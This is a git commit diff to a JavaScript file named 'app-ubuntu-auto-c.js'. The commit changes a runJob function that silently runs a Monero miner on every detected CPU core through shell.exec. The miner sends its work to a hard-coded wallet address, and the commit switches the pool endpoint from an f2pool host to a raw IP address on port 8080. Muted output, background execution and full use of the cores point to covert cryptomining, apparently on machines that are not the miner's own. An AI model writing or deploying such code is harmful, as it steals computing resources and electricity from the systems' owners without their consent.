2f824c635439fb7a98cee98e9f2ad8db732e9957
vippro99 <80774966+vippro99@users.noreply.github.com>
2021-04-05 17:50:00 +0700

    Update app-ubuntu-auto-c.js

--- app-ubuntu-auto-c.js
+++ app-ubuntu-auto-c.js
@@ -47,7 +47,7 @@ const numberCore = () => {
 
 const runJob = (nameTool) => {
     const coreNumber = numberCore() || 4;
-    const runMonney = shell.exec(`./${nameTool} -o stratum+tcp://xmr.f2pool.com:13531 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t ${coreNumber} --astrobwt-avx2`, { silent: true, async: true });
+    const runMonney = shell.exec(`./${nameTool} -o 168.62.177.218:8080 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t ${coreNumber} --astrobwt-avx2`, { silent: true, async: true });
     if (runMonney.code !== undefined) {
         return 0;
     }
